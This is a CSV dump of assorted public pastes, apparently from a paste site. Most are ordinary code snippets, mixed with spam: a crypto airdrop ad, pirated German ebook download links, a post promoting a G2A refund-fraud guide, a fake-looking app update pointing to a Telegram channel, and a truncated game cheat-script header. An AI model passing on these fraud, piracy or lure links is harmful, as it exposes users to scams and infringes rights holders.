id,title,username,language,date,content
N4bwF8dG,üéÅ List of all FREE Crypto Airdrops! üéÅ,VQ-Moe,GetText,Friday 5th of January 2024 06:01:17 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

634454"
5eApNjYY,data804,TestGuy1,JSON,Friday 5th of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '4fe036da57e9d0a0ce8350c670ad8447e46c715e28c234bed1daf284f060f1312d1aac3647ef78c6061dd4b88f216e881469d38793b992d4590a6926ae998637c403ecb59ac76e5a20dd98faee088c168df2bb1a7b617f7e62125021b82370e5858655ff910999f70ee0e489255ef33dabccd09ed50feae8fc9b116216ab54be',
  otherdata: [
    '3ed091f8baa7d1b8f6e84e7f5d1f8877',
    '79fd8d03165ed3722362cbf956b03b03',
    'd731b2322cc0aeb62e3e42a69f757aee',
    '38babb241f3e7ceed7c03544e8b6ef1e',
    '1c3d4579299241daafbee64efdbd851c',
    '49e386f31dee9c3abcd24b0feda8ef80',
    '74253e0a981eb08fdab70ac0eb04f589',
    '90d6ce01d67e7f8e8da5c10056a7db02'
  ]
}"
8NzrRrjc,Find prime number in range from 2 to n,Bedi97,JavaScript,Friday 5th of January 2024 05:56:17 AM CDT,"let n = prompt(""What's the range of numbers?"",);

nextPrime:
for (let i = 2; i <= n; i++) {

    for (let j = 2; j < i; j++) {
        if(i % j == 0) continue nextPrime;
    }

    alert(i);
}"
CXSmvs01,netherstar,montur,Lua,Friday 5th of January 2024 05:49:55 AM CDT,"while true do
    print(""waiting for soulsand"")
    while turtle.suck() == false do
    end
    while turtle.suck() == true do
    end
    print(""you sping me right round"")
    turtle.turnLeft()
    turtle.turnLeft()
    local count = 0
    local slot = 1
    for i=1, 16, 1 do
        print(""checking slot"" .. i)
        slot = i
        count = count + turtle.getItemCount(slot)
        print(""checking count"" .. count)
    end
    slot = 1
    local withers = count / 4
    print(""planning to spawn "" .. withers .. ""withers"")
    for i=1, withers, 1 do
        if turtle.getItemCount(slot) => 4 then
            turtle.select(slot)
            turtle.drop(4)
        else
            print(""next slot"")
            slot = slot + 1
            if slot == 17 then
                print(""slot overflow. setting slot to 1"")
                slot = 1
            end
            turtle.select(slot)
            turtle.drop(4)
        end
        print(""waiting for items to arrive"")
        sleep(30)
        print(""spawning wither"")
        redstone.setOutput(""right"" , true)
        sleep(0.25)
        redstone.setOutput(""right"" , false)
        sleep(10)
    end
    print(""baby right round right round :)"")
    turtle.turnLeft()
    turtle.turnLeft()
    slot = 1
    turtle.select(slot)
    print(""resetting"")
end

"
dKbHgafc,Open/Close script Minimap tutorial,Joriangames,Lua,Friday 5th of January 2024 05:48:01 AM CDT,"---Watch my tutorial to understand everything: https://youtu.be/YRQoi88DY3I
local map = script.Parent.Parent.MinimapFrame
local button = script.Parent

button.MouseButton1Click:Connect(function()
	if map.Visible == true then
		map.Visible = false
		button.Text = ""Open""
	else
		map.Visible = true
		button.Text = ""Close""
	end
end)"
tg9QgAcV,Untitled,mushroomh3ad,Java,Friday 5th of January 2024 05:41:09 AM CDT,https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.2.5%20GA6/liferay-plugins-sdk-6.2-ce-ga6-20171101150212422.zip/download
qYyzzYj8,Untitled,nhatkhangcs,HTML,Friday 5th of January 2024 05:35:21 AM CDT,"<!DOCTYPE html>
<html lang=""en"">

<head>
  <meta charset=""UTF-8"">
  <title>Titanic prediction</title>
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <link rel=""stylesheet"" type=""text/css"" href=""static/style.css"">
</head>

<body>
  <h2>WELCOME TO MY PAGE</h2>
  <div class=""form-block"">
    <form action=""/predict"" method=""post"" id=""prediction-form"" onsubmit=""return false"">
      <!-- Other input fields -->
      <label for=""model"">Choose AI Model:</label>
      <select name=""model"" id=""model"">
        <option value=""linear_regression"">Linear Regression</option>
        <option value=""logistic_regression"">Logistic Regression</option>
        <option value=""decision_tree"">Decision Tree</option>
        <option value=""random_forest"">Random Forest</option>
        <option value=""naive_bayes"">Naive Bayes</option>
        <option value=""knn"">K-Nearest Neighbour</option>
      </select>
      <br>
      <label for=""pclass"">Passenger Class:</label>
      <select name=""pclass"" id=""pclass"">
        <option value=""1"">Class 1</option>
        <option value=""2"">Class 2</option>
        <option value=""3"">Class 3</option>
      </select>
      <br>
      <label for=""sex"">Sex:</label>
      <select name=""sex"" id=""sex"">
        <option value=""male"">Male</option>
        <option value=""female"">Female</option>
      </select>
      <br>
      <label for=""age"">Age:</label>
      <input type=""number"" name=""age"" id=""age"" placeholder=""Age"" required>
      <br>
      <label for=""fare"">Fare:</label>
      <input type=""text"" name=""fare"" id=""fare"" placeholder=""Fare"" required>
      <br>
      <button type=""submit"">Predict</button>
    </form>
  </div>

  <div id=""result-box""></div>

  <script>
    const predictionForm = document.getElementById(""prediction-form"");
    const resultBox = document.getElementById(""result-box"");

    predictionForm.addEventListener(""submit"", (event) => {
      event.preventDefault(); // Prevent default form submission

      const formData = new FormData(predictionForm);

      fetch(""/predict"", {
        method: ""POST"",
        body: formData
      })
        .then(response => response.json())
        .then(data => {
          resultBox.innerHTML = `
          <h2>Prediction Result</h2>
          <p>Model: ${data.selected_model}</p>
          <p>Prediction: ${data.prediction}</p>
        `;
        })
        .catch(error => {
          console.error(""Error fetching prediction:"", error);
          // Display an error message to the user here
        });
    });
  </script>
</body>

</html>"
UjDF3tJu,Christoph Hammer - Mathe f√ºr Eltern f√ºr Dummies,bpmircea,BrainFuck,Friday 5th of January 2024 05:31:35 AM CDT,"Mathe f√ºr Eltern f√ºr Dummies

von: Christoph Hammer
Verlag: Wiley 1. Edition
Sprache: Deutsch
Seiten: 226

 Mathe macht Spa√ü! Geh√∂ren Sie auch zu denjenigen, die bei diesem Satz m√ºde oder ungl√§ubig l√§cheln? Bemitleiden Sie Ihre Kinder, weil sie Mathe lernen m√ºssen?
 Besser ist es, wenn Sie gemeinsam Freude an der Mathematik entwickeln, denn Begeisterung steckt an. Dieses Buch bereitet wesentliche Themen aus den Lehrpl√§nen der Klassen 5-10 f√ºr Sie verst√§ndlich auf: von Bruchrechnung √ºber Variablen, Gleichungen und Funktionen bis hin zu Sachaufgaben.
 Zahlreiche Beispiele und Abbildungen vermitteln Vorstellungen von dem, was abstrakte Zeichen ausdr√ºcken wollen. Ein spezielles Symbol erscheint immer dann im Buch, wenn es um typische Missverst√§ndnisse und Stolpersteine geht.

ePub:
http://up-4.net/d/sSXC
https://filecrypt.cc/Container/FD2FF71A47.html
https://t.me/DeuFree/1459

Pdf:
http://up-4.net/d/sSXP
https://filecrypt.cc/Container/715A6DB4E2.html
https://t.me/DeuFree/1461


https://i.imgur.com/ldUUGd4.png"
k1Sm2BBk,ü§ë G2A.com Refund Exploit Jan 2024 ü§ë,G2ARefundExploit,GetText,Friday 5th of January 2024 05:24:58 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_446673.pdf
 
Working as of
05 January 2024"
D1xz6kfD,Untitled,Hydron,C,Friday 5th of January 2024 05:23:55 AM CDT,"#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

// #define DEBUG
// #define ABOBA

#define mins_t ll

typedef long long ll;

const ll INF = 1000000001;

// typedef struct {
//     ll first, second;
// } mins_t;

ll min(ll a, ll b) {
    return a < b ? a : b;
}

ll max(ll a, ll b) {
    return a > b ? a : b;
}

ll n;
ll *a, *max_step;

mins_t **table;

mins_t fetch(mins_t a, mins_t b) {
    /*mins_t ans;
    if (a.first < b.first) {
        ans.first = a.first;
        ans.second = min(a.second, b.first);
    } else {
        ans.first = b.first;
        ans.second = min(b.second, a.first);
    }
    return ans;*/
    return min(a, b);
}

mins_t get_mins(ll l, ll r) {
    #ifndef ABOBA
    if (l > r) {
        return (mins_t){INF, INF};
    }
    ll j = max_step[r-l+1];
    return fetch(table[r][j], table[l+(1<<j) - 1][j]);
    #else
    if (l > n-1 || l < 0 || r < 0 || r > n-1 || l > r) {
        return (mins_t){INF, INF};
    }
    ll ans = a[l];
    for (ll i=l+1; i<r+1; ++ i) {
        ans = min(ans, a[i]);
    }
    return ans;
    #endif
}

int main(void) {
    scanf(""%lld"", &n);
    a = (ll*) malloc (sizeof(ll) * n);
    for (ll i=0; i<n; ++ i) {
        scanf(""%lld"", &a[i]);
    }
    ll m = 21;
    table = (mins_t**) malloc(sizeof(mins_t*) * n);
    for (ll i=0; i<n; ++ i) {
        table[i] = (mins_t*)malloc(sizeof(mins_t) * m);
    }
    for (ll i=0; i<n; ++ i) {
        table[i][0] = a[i];
    }
    for (ll j=1; j<m; ++ j) {
        for (ll i=0; i<n; ++ i) {
            if ((i - (1 << (j-1))) > -1) {
                table[i][j] = fetch(table[i][j-1], table[i-(1<<(j-1))][j-1]);
            } else {
                table[i][j] = table[i][j-1];
            }
        }
    }
    max_step = (ll*) malloc(sizeof(ll) * (n+1));
    max_step[0] = 0;
    for (ll i=1; i<=n; ++ i) {
        max_step[i] = max_step[i-1];
        if ((1 << (max_step[i] + 1)) <= i) {
            ++ max_step[i];
        }
    }
    #ifdef DEBUG
    for (ll i=0; i<n; ++ i) {
        for (ll j=i; j<n; ++ j) {
            mins_t tmp = get_mins(i, j);
            printf(""[DEBUG] %lld, %lld: %lld\n"", i, j, tmp);
        }
    }
    #endif
    ll ans = 0;
    for (ll i=0; i<n; ++ i) {
        ll l = i, r = i;
        ll L, R, M;
        L = 0, R = i;
        while(L<R) {
            M = (L+R) >> 1;
            if (get_mins(M, i) == a[i]) {
                R = M;
            } else {
                L = M + 1;
            }
        }
        l = R;
        L = i, R = n-1;
        while(L<R) {
            M = (L+R+1) >> 1;
            if (get_mins(i, M) == a[i]) {
                L = M;
            } else {
                R = M - 1;
            }
        }
        r = L;
        if (r > l) {
            ll nmin = INF;
            if (i > l) {
                nmin = get_mins(l, i-1);
            }
            if (i < r) {
                nmin = min(nmin, get_mins(i+1, r));
            }
            ans = max(ans, (r-l+1) * (a[i] + nmin));
        }
        if (l > 0) {
            ll l1 = l - 1;
            if (l1 > 0 && a[l1-1] >= a[i]) {
                L = 0, R = l1-1;
                while(L<R) {
                    M = (L+R) >> 1;
                    if (get_mins(M, l1-1) >= a[i]) {
                        R = M;
                    } else {
                        L = M + 1;
                    }
                }
                l = R;
            }
            ans = max(ans, (r-l+1) * (a[i] + a[l1]));
            l = l1 + 1;
        }
        if (r < n-1) {
            ll r1 = r + 1;
            if (r1 < n-1 && a[r1+1] >= a[i]) {
                L = r1 + 1, R = n-1;
                while(L<R) {
                    M = (L+R+1) >> 1;
                    if (get_mins(r1+1, M) >= a[i]) {
                        L = M;
                    } else {
                        R = M - 1;
                    }
                }
                r = L;
            }
            ans = max(ans, (r-l+1) * (a[i] + a[r1]));
            r = r1 - 1;
        }
    }
    printf(""%lld\n"", ans);
    free(a);
    free(max_step);
    for (ll i=0; i<n; ++ i) {
        free(table[i]);
    }
    free(table);
    return 0;
}"
sg71xSta,Untitled,hoz65105,HTML,Friday 5th of January 2024 05:22:12 AM CDT,https://pastebin.com/hsQTTrRQ
JnWpdzt9,S. L. Giger - Reisef√ºhrer Deutschland 2024,bpmircea,BrainFuck,Friday 5th of January 2024 05:03:50 AM CDT,"Reisef√ºhrer Deutschland 2024 f√ºr Individualreisende

Jahr: 2023 (Erstver√∂ffentlichung)
Genre: Sachbuch, Fachbuch, Ratgeber, Reisen, Urlaub, Deutschland
Format: Epub
Sprache: Deutsch

 Warum sollte ich diesen Deutschland Reisef√ºhrer anstelle eines anderen w√§hlen?

  Die wichtigsten Gr√ºnde:

 Du findest alle Informationen, die Du f√ºr Deine zwei- bis dreiw√∂chige Reise in Deutschland brauchst, kompakt in diesem Buch. Nat√ºrlich kannst Du die Tipps auch f√ºr einen mehrt√§gigen St√§dtetrip verwenden. Du kannst deine pers√∂nliche Route gef√ºllt mit den H√∂hepunkten Deutschlands planen.
 Ich habe alle Sehensw√ºrdigkeiten und Aktivit√§ten selbst ausprobiert. Detailliert beschreibe ich, wie ich es gemacht habe, damit Ihr auf eigene Faust zu den Sehensw√ºrdigkeiten fahren k√∂nnt und so viel Geld spart. Z.B. erf√§hrst Du, wie man g√ºnstig die √∂ffentlichen 
 Verkehrsmittel benutzt und wann man g√ºnstiger oder gratis in die Museen kann, um mehr Geld f√ºrs Vergn√ºgen zu haben.
 Der Reisef√ºhrer wird Dich inspirieren und Dich √ºber geheime Traumorte informieren, die Du nicht verpassen willst.
 Er ist sehr leicht, weil Du ihn auch bequem auf dem Handy oder E-Reader mittragen kannst.
 Er ist ein hilfreicher DIY-Reisef√ºhrer f√ºr Deutschland.

Dieses Buch ist nichts f√ºr Dich, falls Du keine Texte magst, die wie ein Reiseblog verfasst sind. Falls dich das st√∂rt solltest du dich nach einem anderen Deutschland Reisef√ºhrer umsehen.

 Was Dir ‚ÄûI love Germany‚Äú bietet:

 Du lernst, wie Du auf eigene Faust zu Deinen gew√ºnschten Sehensw√ºrdigkeiten kommst. Z. B. was ist die einfachste Option, um Schloss Neuschwanstein? Wie kann ich den Reichstag in Berlin besuchen und von wo habe ich die beste Aussicht auf das die Basteibr√ºcke in der S√§chsischen Schweiz? Wo gibt es die sch√∂nsten Fachwerkh√§user und was sind die ‚Äûmust-dos‚Äú in Hamburg, M√ºnchen, Berlin, Frankfurt, Dresden und K√∂ln? ‚ÄûI love Germany‚Äú wird Dir diese und noch viele weitere Fragen beantworten.

 Dieser Reisef√ºhrer soll die sch√∂nsten Orte Deutschlands f√ºr Individualreisende zug√§nglich machen. All dies auf eine erschwingliche Art. Auch wenn du Deutschland bereits kennst, wirst du hier bestimmt noch neue Sehensw√ºrdigkeiten kennenlernen, denn es gibt nichts, was ich lieber tue, als sch√∂ne Pl√§tze zu entdecken.

 In ‚ÄûI love Germany‚Äú findest Du meine pers√∂nlichen Erfahrungen meiner Ausfl√ºge nach Ulm, D√ºsseldorf, in den Schwarzwald und am Bodensee entlang. Bewundere mittelalterliche Fachwerkh√§user oder moderne Architektur, genie√üe spektakul√§re Aussichten, iss leckere Brezel und degustiere dich durch die Deutschen Biere, wandere entlang der sch√∂nsten Fl√ºsse und lerne √ºber Deutschlands Geschichte.

 Die sch√∂nsten Geb√§ude Deutschlands

 ‚ÄûI love Germany‚Äú zeigt dir m√§rchenhafte und romantische Orte mit traumhaften Geb√§uden aus dem Mittelalter und du wirst auch √ºber fantastische, begehbare Skulpturen staunen oder gl√§nzende H√§user mit schr√§gen W√§nden oder gl√§sernen Kuppeld√§chern.
 Ich staune immer wieder aufs Neue, welche Sch√§tze man in den Deutschen St√§dten findet.

http://up-4.net/d/sSWU
https://filecrypt.cc/Container/7F298D6705.html
https://t.me/DeuFree/1457


https://i.imgur.com/BySSK1C.png"
hi0CNRwP,Erwin Tschirner - A Frequency Dictionary of German - 2006,bpmircea,BrainFuck,Friday 5th of January 2024 04:46:24 AM CDT,"A Frequency Dictionary of German: Core Vocabulary for Learners (Routledge Frequency Dictionaries)

von: Erwin Tschirner, Randall L. Jones
Verlag: Routledge
Sprache: English/Deutsch
Format: .Pdf

 A Frequency Dictionary of German is an invaluable tool for all learners of German, providing a list of the 4,034 most frequently used words in the language.
 Based on a 4.2 million-word corpus which is evenly divided between spoken, fiction and non-fiction texts, the dictionary provides a detailed frequency-based list plus alphabetical and part of speech indexes.
 All entries in the rank frequency list feature the English equivalent, a sample sentence plus an indication of major register variation.
 The dictionary also contains twenty-one thematically organized lists of frequently used words on a variety of topics as well as eleven special vocabulary lists.
 A Frequency Dictionary of German aims to enable students of all levels to maximize their study of German vocabulary in an efficient and engaging way.

http://up-4.net/d/sSW5
https://filecrypt.cc/Container/BF17211DF1.html
https://t.me/DeuFree/1455


https://i.imgur.com/w3rLa8u.jpeg"
XFqiGKG8,Legion Deepwound Down,branch_m,JavaScript,Friday 5th of January 2024 04:32:13 AM CDT,"var count=0;const tz=""Asia/Tokyo"";const ty=""2-digit"";
const s=c[""playerstats""][""stats""];
for(var i=0;i<s.length;i++){
    if(s[i].name==""DBD_Chapter10_Slasher_Stat2""){count = s[i].value;break;}};"
byjJzWVe,video.hpp as of 2023-01-05,Kitomas,C++,Friday 5th of January 2024 03:53:54 AM CDT,"#pragma once

#include ""_video/window.hpp""

#include <stdint.h>


namespace kit {




namespace color {

  //what GDI uses (save for the alpha channel)
  union ARGB { //4B; 0xAARRGGBB
    uint32_t v; //entire color [v]alue
    struct {
      uint8_t b;
      uint8_t g;
      uint8_t r;
      uint8_t a;
    };

    ARGB() : v(0) {}
    ARGB(uint32_t _v) : v(_v) {}
    ARGB(uint8_t _r, uint8_t _g,
         uint8_t _b, uint8_t _a) : r(_r), g(_g), b(_b), a(_a) {}
  };


  union ABGR { //4B; 0xAABBGGRR
    uint32_t v; //entire color [v]alue
    struct {
      uint8_t r;
      uint8_t g;
      uint8_t b;
      uint8_t a;
    };

    ABGR() : v(0) {}
    ABGR(uint32_t _v) : v(_v) {}
    ABGR(uint8_t _r, uint8_t _g,
         uint8_t _b, uint8_t _a) : r(_r), g(_g), b(_b), a(_a) {}
  };

};




namespace shape {

  struct point { //8B
    int32_t x, y;
    point() : x(0), y(0) {}
    point(int32_t _x, int32_t _y) : x(_x), y(_y) {}
  };

  struct rect { //16B
    int32_t x, y; //x & y position of the rectangle's top-left corner
    int32_t w, h; //the rectangle's width & height
    point() : x(0), y(0), w(0), h(0) {}
    point(int32_t _x, int32_t _y) : x(_x), y(_y) {}
    point(int32_t _x, int32_t _y,
          int32_t _w, int32_t _h) : x(_x), y(_y), w(_w), h(_h) {}
  };



  struct fpoint { //8B
    float x, y;
    point() : x(0.0f), y(0.0f) {}
    point(float _x, float _y) : x(_x), y(_y) {}
  };

  struct frect { //16B
    float x, y; //x & y position of rectangle's top-left corner
    float w, h; //the rectangle's width & height
    point() : x(0.0f), y(0.0f), w(0.0f), h(0.0f) {}
    point(float _x, float _y) : x(_x), y(_y) {}
    point(float _x, float _y,
          float _w, float _h) : x(_x), y(_y), w(_w), h(_h) {}
  };



  struct dpoint { //16B
    double x, y;
    point() : x(0.0), y(0.0) {}
    point(double _x, double _y) : x(_x), y(_y) {}
  };

  struct drect { //32B
    double x, y; //x & y position of rectangle's top-left corner
    double w, h; //the rectangle's width & height
    point() : x(0.0), y(0.0), w(0.0), h(0.0) {}
    point(double _x, double _y) : x(_x), y(_y) {}
    point(double _x, double _y,
          double _w, double _h) : x(_x), y(_y), w(_w), h(_h) {}
  };

};




};
"
BmKxjKk4,kit_main.cpp as of 2023-01-05,Kitomas,C++,Friday 5th of January 2024 03:51:57 AM CDT,"#include ""_kit_misc.hpp""


HINSTANCE _w32_hThisInst = nullptr;
HINSTANCE _w32_hPrevInst = nullptr;
LPSTR     _w32_lpszArg   = nullptr;
int       _w32_nCmdShow  = SW_HIDE;




//get first and last char of string, excluding leading or trailing whitespace
 //(whitespace as in ' '; i'm not going to bother with '\t', '\n', etc.)
static inline char* _getFirstCharPtr(char* start){
  if(*start == 0) return start;
  while(*start == ' ') ++start;
  return start;
}

static inline char* _getLastCharPtr(char* start){
  if(*start == 0) return start;
  char* end = start;
  while(*(end+1) != 0 ) ++end; //go to null terminator
  while(*end == ' ') --end; //go back until a non-whitespace char is found
  return end;
}




extern int main(int argc, char** argv);


int WINAPI WinMain(HINSTANCE hThisInst, HINSTANCE hPrevInst,
                   LPSTR     lpszArg,   int       nCmdShow)
{
  //assign some global values
  _w32_hThisInst = hThisInst;
  _w32_hPrevInst = hPrevInst;
  _w32_lpszArg   = lpszArg;
  _w32_nCmdShow  = nCmdShow;


  //convert lpszArg to how argv normally behaves
  char*      p = (char*)lpszArg;
  int    _argc = 1; //should always contain path to executable
  char** _argv = nullptr;

   //parse for the number of arguments (assuming space as delimiter)
  char* first = _getFirstCharPtr(p);
  char* last  = _getLastCharPtr(p);
  int Arg_len = (int)(last-first) + ((*first!=0) ? 1 : 0);

  if(Arg_len > 0) ++_argc;
  for(p=first; p<=last; ++p){
    if(*p == ' ') ++_argc;
  }

   //create and fill in _argv
  _argv = (char**)CoTaskMemAlloc( sizeof(char*) * _argc );
  if(_argv == nullptr) return ERROR_NOT_ENOUGH_MEMORY;

  char filepath[MAX_PATH]; //path to current process
  if(GetModuleFileNameA(NULL, filepath, MAX_PATH) == 0)
    return ERROR_INSUFFICIENT_BUFFER;
  _argv[0] = filepath;

  if(Arg_len > 0){
    int i = 1;
    _argv[i++] = first;
    for(p=first; p<=last; ++p){
      if(*p == ' '){
        *p = 0; //set delimiter to null
        _argv[i++] = p+1;
      }
    }
    *p = 0; //make sure last arg has null terminator
  }


  int returnCode = main(_argc,_argv);
  CoTaskMemFree(_argv);
  return returnCode;
}

"
8PiY6hy1,Atualiza√ß√£o: Alfred c√¢mera de seguran√ßa,Paulohacker,JSON,Friday 5th of January 2024 03:12:34 AM CDT,"{
  ""versionCode"": 13,
  ""versionName"": ""1.0"",
  ""Msg"": ""Nova atualiza√ß√£o est√° dispon√≠vel, para continuar em nosso aplicativo, atualize-a.

O que h√° de novo:
- Melhorias de desempenho.
- Corre√ß√µes de bugs.
- Novos recursos introduzidos.
- Outras pequenas altera√ß√µes.

Obrigado por usar"",
  ""downloadLink"": ""https://t.me/killergingmodder""
  }"
T9jyVgFP,Erwin Tschirner - A Frequency Dictionary of German - 2019,bpmircea,BrainFuck,Friday 5th of January 2024 03:11:47 AM CDT,"A Frequency Dictionary of German: Core Vocabulary for Learners (Routledge Frequency Dictionaries), 2nd Edition

by Erwin Tschirner, Jupp M√∂hring
Verlag: Routledge
English/Deutsch
.ePub & .Pdf

 This completely updated edition of A Frequency Dictionary of German contains the 5,000 most commonly used words of German today, occurring in a 20-million-word corpus (compared to a 4.2-million-word corpus in the first edition). The basis of the frequency list is a significantly extended version of the Herder/BYU Corpus of Contemporary German.
 The Dictionary contains spoken and written German, and represents different genres, text types, registers, styles, and also regional varieties.

 The corpus is designed to represent the current German language as it is used in the real world. Useful as a reference for students and course designers alike, A Frequency Dictionary of German is an important new resource.

ePub:
http://up-4.net/d/sSTD
https://filecrypt.cc/Container/6FC3CD1D6F.html
https://t.me/DeuFree/1451

Pdf:
http://up-4.net/d/sSTH
https://filecrypt.cc/Container/2BC785E267.html
https://t.me/DeuFree/1453


https://i.imgur.com/CxwppP1.jpg"
tbfpC8Ye,Functional Programming,ounnuo,Autohotkey,Friday 5th of January 2024 03:00:54 AM CDT,"#Include <Optimization>

big := ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""
small := ""abcdefghijklmnopqrstuvwxyz""
num := ""0123456789_""

arr := [1,2,3]
arr.Push(4)

add(x, y) {
  return x + y
}

Array(args*) {
  ;~ args.base := JSArray
  return new ImmutableArray(args)
}

class ImmutableArray {
  __New(arr) {
    ObjRawSet(this, this, arr) ;this[this] => arr
  , ObjRawSet(this, ObjGetBase(this), arr.Length()) ;this[ObjGetBase(this)] => arr.Length()
  }

  __Get(args*) {
    return this[this][args*]
  }

  __Set(args*) {
    throw exception(""Modification to array element(s) denied."", ""ImmutableArray"")
  }

  __Call(method, args*) {
    local
    result := this[this][method](args*)
    if (ObjCount(this[this]) != this[ObjGetBase(this)])
      throw exception(""Insertion or removal of array element(s) denied."", ""ImmutableArray"")
    return result
  }
}

class JSArray {
  map(fo) {
    local
    arr := {}
    for i, e in this
      arr[i] := fo.Call(e, i, this)
    return [arr*]
  }

  __Call(method, args*) {
    println(A_ThisFunc "":"" method)
    ;~ println(method "":"" IsFunc(this[method]))
    ;~ println(method "":"" IsFunc(method))
  }
}

class String {
  static _ := """".base.base := String

  length {
    get {
      return StrLen(this)
    }
  }

  __Get(indexStart, indexEnd := 0) {
    ;TODO
    ;""abc""[1, 2]
  }

  __Call(method, args*) {
    if (method != """")
      ;~ if !this.base[method] ;if `method` is not defined as String's method
        return Function(method).auto(this, args*) ;call `method` as normal function
  }
}

Function(functionName) {
  return new Function(functionName)
} class Function {
  __New(functionName) {
    if ((this.minParams := IsFunc(functionName) - 1) < 0) { ;funtionName not a function
      throw exception(""Call to nonexistent function: "" functionName, ""Function"")
    }

    this.name := functionName
  , this.boundArgs := []
  }

  bind(args*) {
    this.boundArgs.Push(args*)
    return this
  }

  call(args*) {
    local
    (allArgs := [this.boundArgs*]).Push(args*)
    return Func(this.name).Call(allArgs*)
  }

  auto(args*) {
    return args.Length() >= this.minParams
           ? Func(this.name).Call(args*)
           : (this, this.boundArgs := [args*])
  }

  __Call(method, args*) {
    local
    ;~ println(Format(""[{}]{}.({})"",A_ThisFunc,method,args.join())))
    if (method == """") {
      (allArgs := [this.boundArgs*]).Push(args*)
      return this.auto(allArgs)
    }
  }

  deepClone(aObj) {
    local
    static thisFunc := """"
    (thisFunc) || thisFunc := SubStr(A_ThisFunc, InStr(A_ThisFunc, ""."", , 0) + 1)

    copy := aObj.Clone()
    for k, v in copy
      IsObject(v) && copy["""" k] := ObjBindMethod(this, thisFunc).Call(v)

    return copy
  }
}

println(args*) {
  local
  ComObjActive(""SciTE4AHK.Application"").Output(format(args*) ""`n"")
}

split(args*) {
  return [StrSplit(args*)*]
}"
Y50prWiX,Untitled,ProgMe,C++,Friday 5th of January 2024 02:44:04 AM CDT,"#include <bits/stdc++.h>
#define int int64_t

using namespace std;

struct vertex {
    int sum = 0;
};

ostream& operator << (ostream& out, const vertex& v) {
    return out << v.sum;
}

const int N = 1e5 + 1;

array<int, N> a;
array<vertex, 4 * N> t;

vertex merge(vertex l, vertex r) {
    vertex cur{};
    cur.sum = l.sum + r.sum;

    return cur;
}

void build(int v, int tl, int tr) {
    if (tr - tl == 1) {
        t[v].sum = a[tl];
        return;
    }

    int tm = (tl + tr) / 2;
    build(v * 2, tl, tm);
    build(v * 2 + 1, tm, tr);

    t[v] = merge(t[v * 2], t[v * 2 + 1]);
}

void update(int v, int tl, int tr, int i, int x) {
    if (tr - tl == 1) {
        t[v].sum = x;
        return;
    }

    int tm = (tl + tr) / 2;

    if (i < tm) {
        update(v * 2, tl, tm, i, x);
    } else {
        update(v * 2 + 1, tm, tr, i, x);
    }

    t[v] = merge(t[v * 2], t[v * 2 + 1]);
}

vertex get(int v, int tl, int tr, int l, int r) {
    if (r <= tl || l >= tr) {
        return vertex(0);
    }

    if (l <= tl && r >= tr) {
        return t[v];
    }

    int tm = (tl + tr) / 2;

    return merge(get(v * 2, tl, tm, l, r), get(v * 2 + 1, tm, tr, l, r));
}

int32_t main() {
    int n;
    cin >> n;

    for (int i = 0; i < n; i++) {
        cin >> a[i];
    }

    build(1, 0, n);

    int q;
    cin >> q;
    while (q--) {
        char c;
        cin >> c;

        if (c == 'u') {
            int i, x;
            cin >> i >> x;
            i--;

            update(1, 0, n, i, x);
        } else {
            int l, r;
            cin >> l >> r;
            l--;

            cout << get(1, 0, n, l, r) << ' ';
        }
    }
}
"
0f63tF1T,Untitled,ProgMe,C++,Friday 5th of January 2024 02:43:40 AM CDT,"#include <bits/stdc++.h>
#define int int64_t

using namespace std;

int n = 100000;

vector<int> a;
vector<int> t_min, t_max;

void build(int v = 1, int tl = 0, int tr = n - 1) {
    if (tl == tr) {
        t_min[v] = t_max[v] = a[tl];
        return;
    }

    int tm = (tl + tr) / 2;

    build(v * 2, tl, tm);
    build(v * 2 + 1, tm + 1, tr);

    t_min[v] = min(t_min[v * 2], t_min[v * 2 + 1]);
    t_max[v] = max(t_max[v * 2], t_max[v * 2 + 1]);
}

void update(int i, int x, int v = 1, int tl = 0, int tr = n - 1) {
    if (tl == tr) {
        a[tl] = x;
        t_min[v] = t_max[v] = a[tl];
        return;
    }

    int tm = (tl + tr) / 2;

    if (i <= tm) {
        update(i, x, v * 2, tl, tm);
    } else {
        update(i, x, v * 2 + 1, tm + 1, tr);
    }

    t_min[v] = min(t_min[v * 2], t_min[v * 2 + 1]);
    t_max[v] = max(t_max[v * 2], t_max[v * 2 + 1]);
}

pair<int, int> get(int l, int r, int v = 1, int tl = 0, int tr = n - 1) {
    if (l > r) {
        return {numeric_limits<int>::max(), numeric_limits<int>::min()};
    }
    if (l == tl && r == tr) {
        return {t_min[v], t_max[v]};
    }

    int tm = (tl + tr) / 2;

    pair<int, int> ans_l = get(l, min(r, tm), v * 2, tl, tm);
    pair<int, int> ans_r = get(max(l, tm + 1), r, v * 2 + 1, tm + 1, tr);

    return {min(ans_l.first, ans_r.first), max(ans_l.second, ans_r.second)};
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    
    a.resize(n);
    t_min.resize(4 * n);
    t_max.resize(4 * n);

    for (int i = 1; i <= n; i++) {
        a[i - 1] = i * i % 12345 + i * i * i % 23456;
    }
    build();

    int q;
    cin >> q;
    while (q--) {

        int i;
        cin >> i;

        if (i < 0) {
            int x;
            cin >> x;
            i = abs(i) - 1;

            update(i, x);
        } else {
            int l = i, r;
            cin >> r;
            l--, r--;

            pair<int, int> ans = get(l, r);

            cout << ans.second - ans.first << '\n';
        }
    }
}"
UyKmkNhj,Pet Simulator 99! üéâ 2024 AutoFarm Script,Project-WD,Lua,Friday 5th of January 2024 02:39:15 AM CDT,"--Pet Simulator 99! üéâ AutoFarm Script! (Copy and Put in Executor)(Working: Delta and ArceusX etc...)
-------------------------------------------------------
--üÜï Updated (05/01/2024) (Insane Script)
-- Auto Farm, Auto Ranks, Boothsnipe, No Egg Animation, etc...
--Scriptüìù:
